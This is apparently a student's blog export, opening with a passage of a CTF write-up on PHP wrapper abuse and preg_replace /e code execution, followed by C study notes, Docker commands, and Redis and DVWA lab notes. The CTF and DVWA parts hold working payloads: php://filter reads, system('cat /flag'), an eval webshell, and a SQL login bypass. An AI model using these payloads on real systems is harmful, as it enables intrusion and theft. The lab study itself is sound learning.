<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php</span><br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure>

<p>传两个参数，text和file，之间用&amp;连接即可</p>
<p>目的是获得下列提示的    next.php</p>
<p>要满足传入的文件内容为：I have a dream</p>
<p>使用php伪协议中的data:协议和php的filter:协议</p>
<p>构造：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,I have a dream&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=<span class="hljs-keyword">next</span>.php<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/06/2021/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p>
<p>解码后代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>$id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br>$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params">$re, $str</span>) </span>&#123;<br><br>  <span class="hljs-keyword">return</span> preg_replace(<br><br>​    <span class="hljs-string">&#x27;/(&#x27;</span> . $re . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br><br>​    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br><br>​    $str<br><br>  );<br><br>&#125;<br><br><span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;<br><br>  <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>  @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现 preg_replace（）函数是一个代码执行的问题</p>
<p>发现这是用固定解题格式： <strong>\S*=${}</strong></p>
<p><strong>payload1</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/06/2021/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p>
<p><strong>payload2</strong></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">next</span>.php?\S*=$&#123;<span class="hljs-built_in">eval</span>($_POST[cmd])&#125;<br></code></pre></td></tr></table></figure>

<p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p>
<p><img src="/2021/08/06/2021/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p>
<p>上传成功：</p>
<p><img src="/2021/08/06/2021/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p>
<p><img src="/2021/08/06/2021/buu/8/image-20210806092557240.png" alt="image-20210806092557240"></p>
<p>或者</p>
<p><img src="/2021/08/06/2021/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p>
<p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>CTF·rce</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis的一些记录</title>
    <url>/2022/02/14/2022/2/Redis%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h1><p> 最近在学习一些关于Redis漏洞的利用</p>
<p> 用一点时间记录一下</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>首先是得先安装redis以及相关的服务</p>
<p>我参考几篇文章后觉得这篇最好</p>
<p><a href="https://blog.csdn.net/qq_38375394/article/details/111660881">redis 更新升级版本_qq_38375394的博客-CSDN博客_redis升级</a></p>
<p>总结一下步骤就是：</p>
<p>1.检测虚拟机或者vps的网络是否ping通</p>
<p>2.确认是否有旧版本的redis，若有则删除；确实是否有gcc（一般linux中kali会有）</p>
<p>ubuntu上直接命令安装即可，但是centos上要安装7版本的才行，不然编译时后面会报错</p>
<p>3.因为我的vps版本是centos，所有就在装php有关redis的扩展用了这篇文章</p>
<p><a href="https://blog.csdn.net/baidu_30000217/article/details/51481138">Centos7下安装php-redis扩展及简单使用_LSGOZJ的博客-CSDN博客_centos php redis扩展</a></p>
<p>顺便学习了下centos寻找文件的操作</p>
<p>[centos文件查找命令 - 林** - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/redhat0019/p/9602960.html#:~:text=centos%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4">https://www.cnblogs.com/redhat0019/p/9602960.html#:~:text=centos文件查找命令</a>. 在使用linux时，经常需要进行文件查找。. 其中查找的命令主要有find和grep。. 两个命令是有区的。. 区别： (1)find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。.,(2)grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式 (patter)进行匹配查找。. 一.find命令. 基本格式：find path expression. 1.按照文件名查找.)</p>
<p>4.<img src="/2022/02/14/2022/2/Redis%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/image-20220214211501591.png" alt="image-20220214211501591"></p>
<p>这边就是关键的地方，这样才能确认安装成功</p>
<p>要想其他ip能够连接就得配置好文件redis.conf</p>
<p><img src="/2022/02/14/2022/2/Redis%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/image-20220214211707389.png" alt="image-20220214211707389"></p>
<p>这里是作者直接命令修改，我是到vim编辑器慢慢修改的</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p><a href="https://smling.blog.csdn.net/article/details/115588489">Redis数据库漏洞总结_星落的博客-CSDN博客_redis数据库漏洞</a></p>
<p>这篇文章总结得很不错</p>
<p>我尝试了里面的两种方法：Redis直接写webshell（我之前做玄武杯ssrfme的时候就是用到这个方法）和利用计划任务反弹shell（nc和bash），都在虚拟机里完成</p>
<p>写入公钥的需要高权限</p>
<p>另外的主从复制做ctf题目的时候就失败了==</p>
<p>就是比较奇怪，建立从节点后，主机并没有收到？</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言求余问题</title>
    <url>/2020/11/02/2021/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
<p>a，b，c，d</p>
<p>b=a/100；</p>
<p>c=a/10%10;</p>
<p>d=a%10;</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言注</title>
    <url>/2020/10/18/2021/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
    <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
<p>1 定义语句、执行语句以分号 ；结尾</p>
<p>2 必须有主函数   main（）</p>
<p>3 标识符由字母、数字和下画线-组成，</p>
<p>第一个字符必须是字母或下画线</p>
<p>4 char字符型                 字符型数据（char），用来储存字符</p>
<p>​                                       储存内容为字符对于ASCII 码</p>
<p>5 getchar 是从键盘缓冲区获取一个字符（输入单个字时）</p>
<p>而putchar是把参数指定的字符变量的字符输出（输出单个字符）</p>
<p>eg：char ch；</p>
<p>​         ch=getchar（): 运行到这里输入一个字符后必须回车一下getchar才返回</p>
<p>putchar （ch）</p>
<p>8 小数四舍五入  scanf （”%f”，&amp;a）</p>
<p>​                             a=int（a*1000+0.5）/1000.0</p>
<p>​                             printf(“%0.3f”,a)</p>
<p>C中保留两位小数</p>
<p>1、float a=3.456</p>
<p>​      float b=(int)(a*1000+0.5)/100.0</p>
<p>2、float a=23,456789</p>
<p>​      printf(“%2f”,a);</p>
<p>9 scanf( )式格式输入函数</p>
<p>它从标准输入设备(键盘)读取输入的信息</p>
<p>10 double area</p>
<p>建立一个类型为双精度浮点小数的变量，这个变量的名称是area</p>
<p>%5.2f含义：输出一个浮点数</p>
<p>格式为小数点前最多保留5位有效数字</p>
<p>​            小数点后最多保留2位有效数字</p>
<h4 id="在C语言中，能够获取字符串的函数至少有两个："><a href="#在C语言中，能够获取字符串的函数至少有两个：" class="headerlink" title="在C语言中，能够获取字符串的函数至少有两个："></a>在C语言中，能够获取字符串的函数至少有两个：</h4><p>1.scanf()</p>
<p>所在头文件：stdio.h</p>
<p>语法：scanf(“格式控制字符串”,变量地址列表);</p>
<p>接受字符串时：scanf(“%s”,字符数组名或指针);</p>
<p>2.gets()</p>
<p>所在头文件：stdio.h</p>
<p>语法：gets(字符数组名或指针);</p>
<p>两者在接受字符串时：</p>
<p>1.不同点：<br>gets可以接收空格；而scanf遇到空格、回车和Tab键都会认为输</p>
<p>入结束，所有它不能接收空格。</p>
<p>2.相同点：</p>
<p>字符串接受结束后自动加’\0’。</p>
<h4 id="printf和puts的区别"><a href="#printf和puts的区别" class="headerlink" title="printf和puts的区别"></a>printf和puts的区别</h4><p>相同点：<br>两者都属于stdio.h这个头文件<br>都能输出字符串</p>
<p>不同点：<br>puts（）在输出字符串时会将’\0’自动转换成’\n’进行输出，也就是说，puts方法输出完字符串后会自动换行。</p>
<ul>
<li><h2 id><a href="#" class="headerlink" title></a></h2></li>
</ul>
<p> hexo new post 新建文章</p>
<p>C 程序主要包括以下部分：</p>
<ul>
<li><p>预处理器指令</p>
</li>
<li><p>函数</p>
</li>
<li><p>变量</p>
</li>
<li><p>语句 &amp; 表达式</p>
</li>
<li><p>注释</p>
<p>变量其实只不过是程序可操作的存储区的名称</p>
<table>
<thead>
<tr>
<th>char</th>
<th>通常是一个字节（八位）。这是一个整数类型。</th>
</tr>
</thead>
<tbody><tr>
<td>int</td>
<td>对机器而言，整数的最自然的大小。</td>
</tr>
<tr>
<td>float</td>
<td>单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。</td>
</tr>
<tr>
<td>double</td>
<td>双精度浮点值。双精度是1位符号，11位指数，52位小数。</td>
</tr>
<tr>
<td>void</td>
<td>表示类型的缺失。</td>
</tr>
</tbody></table>
</li>
</ul>
<p>   C 程序中可用的存储类：</p>
<ul>
<li><p>auto</p>
</li>
<li><p>register</p>
</li>
<li><p>static</p>
</li>
<li><p>extern</p>
</li>
</ul>
<p>求余、模运算符（%）时bai要求两数必须是整型数据。%就是bai取余数运算,也就是模运算（mod）。</p>
<p>10/3在C语言里是整除的意思，结果是3</p>
<p>10%3是求余，结果是余数1</p>
<p>10.0/3会转换为两个double型的数相除，答案是3.3333</p>
<p>   7%4的结果是3<br>   -7%4的结果是-3<br>   3%-4的结果是3（**<em>结果符号与被除数相同**</em>）</p>
<p>代码输入时无需特意对齐，注意符号即可。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>函数递归</title>
    <url>/2020/11/14/2021/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
    <content><![CDATA[<p> 递归思想</p>
<p>格式：void recursion() </p>
<p>{   statements;   … … …   recursion(); /* 函数调用自身 */  </p>
<p> … … … </p>
<p>}</p>
<p>  int main() </p>
<p>{   recursion();</p>
<p> }</p>
<p>应用到求<u><strong>阶乘上，还有斐波那契数列</strong></u></p>
<p> 递归函数可以使它调用其本身</p>
<p>但是存在不利情况：</p>
<p>电脑空间大致分<strong>Heap（堆）</strong>和<strong>Stack（栈）</strong>两种。</p>
<p><strong>栈</strong>是用于<strong>函数</strong>的空间。</p>
<p>电脑调用一个函数，就会使用一层栈；</p>
<p>相反，电脑中一个函数结束（return），就会释放这一层栈，<strong>连同在这层栈（这个函数）中定义的所有东西</strong>。</p>
<p>不在栈中的，应该就在堆中。<strong>（这就是定义全区变量与局部变量的用处）</strong></p>
<p><strong>如果调用太多层栈（太多个函数），**</strong>电脑就会暴空间！**</p>
<p>所以说，调用递归函数，就会<strong>一层一层地压栈</strong>，<strong>电脑就会暴空间！</strong>（<strong>并不代表不建议用递归，只是作提示而已</strong>）</p>
<p><strong>递归</strong>，就是<strong>递（一层一层地调用）</strong>，<strong>归（一层一层地返回）</strong>，这样会<strong>费很多时间</strong>！容易<strong>超时</strong>！</p>
<p><strong>但是，</strong>我并<strong>不是</strong>说不用递归，<strong>而是</strong>说能用递推算法的，最好不用递归算法，（原因你知道）。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>占用内存有关</title>
    <url>/2020/10/15/2021/c/%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E6%9C%89%E5%85%B3/</url>
    <content><![CDATA[<p>让整数占用更少的内存可以在 int 前边加 short，让整数占用更多的内存可以在 int 前边加 long，例如：</p>
<p>short int a = 10;<br>short int b, c = 99;<br>long int m = 102023;<br>long int n, p = 562131;</p>
<p>这样 a、b、c 只占用 2 个字节的内存，而 m、n、p 可能会占用 8 个字节的内存。</p>
<p>也可以将 int 省略，只写 short 和 long，如下所示：</p>
<p>short a = 10;<br>short b, c = 99;<br>long m = 102023;<br>long n, p = 562131;</p>
<p>这样的写法更加简洁，实际开发中常用。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串连接</title>
    <url>/2020/12/07/2021/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<h4 id="今日：与字符串链接有关的函数"><a href="#今日：与字符串链接有关的函数" class="headerlink" title="今日：与字符串链接有关的函数"></a>今日：与字符串链接有关的函数</h4><p>strcpy，strcat；<br>strcat函数：<br>将两个char类型连接。<br>strcpy函数：<br>头文件：#include &lt; string.h&gt; 和 #include &lt;stdio.h&gt;<br>功能：把从src地址开始且含有NULL结束符的字符串复制到以dest开始的 地址空间</p>
<p>​                              可变参数  链接：<a href="https://blog.csdn.net/longintchar/article/details/85490103">https://blog.csdn.net/longintchar/article/details/85490103</a></p>
<p>[^摘取自链接：<a href="https://blog.csdn.net/slk11580/article/details/79571478]">https://blog.csdn.net/slk11580/article/details/79571478]</a>: </p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>指针</title>
    <url>/2020/11/08/2021/c/%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<p> 指针和指针变量</p>
<p>char *pa;//  定义一个指向字符型的指针变量；</p>
<p>int *pb;//   定义一个指向整型的指针变量；</p>
<p>取地址运算符  &amp;</p>
<p>取值运算符   *</p>
<p>未理解的</p>
<p>（now，a）</p>
<p>( the addr of a is)</p>
<p>避免访问未初始化的指针</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>二维数组</title>
    <url>/2020/11/08/2021/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p> 二维数组（矩阵）</p>
<p>例子：int a[6] [6] ;//6*6,6行6列</p>
<p>访问二维数组 </p>
<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
<p>注意防止越界访问（取值范围）</p>
<p>二维数组初始化，可用嵌套语句for</p>
<p>二维数组也可以对部分元素赋值</p>
<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>水仙花数、素数</title>
    <url>/2020/10/31/2021/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
    <content><![CDATA[<p>   <strong>水仙花数</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br>int main()<br>&#123;<br>	int a,b,c,d;<br>	scanf(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);<br>	<span class="hljs-attribute">b</span>=a/100;<br>	<span class="hljs-attribute">c</span>=a/10%10;<br>	<span class="hljs-attribute">d</span>=a%10;<br>	<span class="hljs-keyword">if</span>(b<span class="hljs-number">*100</span>+c<span class="hljs-number">*10</span>+<span class="hljs-attribute">d</span>==b*b*b+c*c*c+d*d*d) printf(<span class="hljs-string">&quot;Yes&quot;</span>);<br>	<span class="hljs-keyword">else</span>  printf(<span class="hljs-string">&quot;No&quot;</span>);<br>	return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>注意取余，若要求求出范围内的所有水仙花数，则用for语句。</p>
<p>​    <strong>素数</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> IsPrime(<span class="hljs-built_in">int</span> x)<br><br>&#123;  <span class="hljs-built_in">int</span> i;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;x;i++)<br><br><span class="hljs-keyword">if</span>(!(x%i))<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>rerurn <span class="hljs-number">1</span>;<br><br>&#125;                                     <br></code></pre></td></tr></table></figure>

<p> 解释：x%i 的意思是 x对i求余，整个意思是 ：如果 x对i的余数是0      则为真</p>
<p>​                                                   就接着执行下面的程序。 </p>
<p>​                                                           </p>
<h3 id="写prime函数判断一个数是否是素数"><a href="#写prime函数判断一个数是否是素数" class="headerlink" title="写prime函数判断一个数是否是素数"></a>写prime函数判断一个数是否是素数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span> <span class="hljs-params">( )</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> m,n,i,j,k;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);<br><span class="hljs-keyword">for</span>(i=m;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(i==<span class="hljs-number">2</span>) &#123; <span class="hljs-comment">//如果是bai2， 直接输出。</span><br><span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;%d &quot;</span>, i);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">2</span>;j&lt;i;j++) <span class="hljs-comment">//应该是j&lt;i</span><br><span class="hljs-keyword">if</span>(i%j==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//这个break只能跳du出最内层的for循环</span><br><span class="hljs-keyword">if</span>(j==i) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,i); <span class="hljs-comment">//printf应该放到循zhi环外，并且只有当j==i的时候i才是dao素数</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2021/04/25/2021/docker/docker/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%7B%22request_id%22:%22162380439616780269841164%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162380439616780269841164&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576.first_rank_v2_pc_rank_v29&utm_term=docker&spm=1018.2226.3001.4187">(24条消息) docker入门(利用docker部署web应用)_仰望星空-CSDN博客_docker部署web项目</a></p>
<p>这篇文章不错喔</p>
<p>2021.6.16成功在 kali2020 安装了docker</p>
<p>参考文章如下：</p>
<p><a href="https://www.cnblogs.com/lijingrong/p/13396884.html">kali 2020安装docker - pipiqiu - 博客园 (cnblogs.com)</a></p>
<p>其中一些命令：</p>
<p>查看doucker运行状态（以下显示已启动和未启动）</p>
<p><code>sudo systemctl status docker 或者 sudo service docker status</code></p>
<p> 开启和停止docker服务</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">sudo systemctl start docker 或者sudo<span class="hljs-built_in"> service </span>docker start<br>sudo systemctl stop docker 或者 sudo<span class="hljs-built_in"> service </span>docker stop<br></code></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>程序实验三</title>
    <url>/2020/11/12/2021/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><br><span class="hljs-type">int</span> reverse(<span class="hljs-type">int</span> n)<br><br>&#123;<br><br>​          <span class="hljs-type">int</span> <span class="hljs-keyword">temp</span>=<span class="hljs-number">0</span>;<br>​	<span class="hljs-keyword">while</span> (n!=<span class="hljs-number">0</span>)<br>​	&#123;<br>​		<span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>*<span class="hljs-number">10</span>+n%<span class="hljs-number">10</span>;<br>​		n=n/<span class="hljs-number">10</span>;<br>​		<br><br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">temp</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>2、倒金字塔</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">int</span> i,n,j;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个整数: \n&quot;</span>);<br>	<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>	&#123;<br>	  <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>;j&lt;i;j++)<br>	    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>     	<span class="hljs-keyword">for</span>(j=<span class="hljs-number">2</span>*n<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>;j--)<br>     	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);<br>	     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>3、求和</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">int</span> main()<br>&#123;<br>	<span class="hljs-built_in">int</span> a,<span class="hljs-built_in">n</span>,i,j,<span class="hljs-built_in">sum</span>;<br>	printf(<span class="hljs-string">&quot;请输入两个整数分别为a= n= \n&quot;</span>);<br>	scanf(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;a,&amp;<span class="hljs-built_in">n</span>);<br>	<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>	for(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-built_in">n</span>;i++)<br>		j=j*<span class="hljs-number">10</span>+a;<br>		<span class="hljs-built_in">sum</span>=<span class="hljs-built_in">sum</span>+j;<br>		printf(<span class="hljs-string">&quot;a+aa+aaa+.....=%d\n&quot;</span>,<span class="hljs-built_in">sum</span>);<br>	&#125; <br>	return <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>1-5</title>
    <url>/2021/02/18/2021/dvwa/1-5/</url>
    <content><![CDATA[<p>推荐文章：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p>
<h4 id="brute-force："><a href="#brute-force：" class="headerlink" title="brute force："></a>brute force：</h4><p> 1.如题暴力破解，采用burp suite字典进行猜测用户名和密码</p>
<p> 2.使用“万能密码”：admin’ or’1’=’1</p>
<h4 id="file-upload："><a href="#file-upload：" class="headerlink" title="file upload："></a>file upload：</h4><p>（这里直接去做一做uploads靶场会更有收获）</p>
<p>看代码安全程度低，对于上传数据没有进行过滤，</p>
<p>所以直接上传一句话木马，php文件进行连接。</p>
<p>file upload1：1.抓包，修改数据：1.jpg更改为1.php上传，成功。</p>
<p>../../hackable/uploads/1.php succesfully uploaded!</p>
<p>​                2.采用%00截断的方法可以轻松绕过文件名的检查</p>
<p>%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式,比如改包时1.php.jpg</p>
<p>Sql:使用sqlmap跑的时候，因为自己的安装问题，执行命令必须以sqlmap.py -u的格式</p>
<h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>暂时不太理解，所以另外去摘抄了其他博主内容作为文章。</p>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>其实和之前在sql靶场学习的差不多，思路基本上是：</p>
<p>爆字–爆段–报表–爆内容</p>
<p>对于难度的区别的话，无非low等级可以直接输入句子查询，而medium等级之后完全可以抓包来实现语句查询（篡改）</p>
<p><img src="/2021/02/18/2021/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(44).png"></p>
<p><img src="/2021/02/18/2021/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(45).png"></p>
<p><img src="/2021/02/18/2021/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(46).png"></p>
<p><img src="/2021/02/18/2021/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>csrf</title>
    <url>/2021/02/22/2021/dvwa/csrf/</url>
    <content><![CDATA[<p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery）</p>
<p>感觉似曾相识，直到看到下面的话:</p>
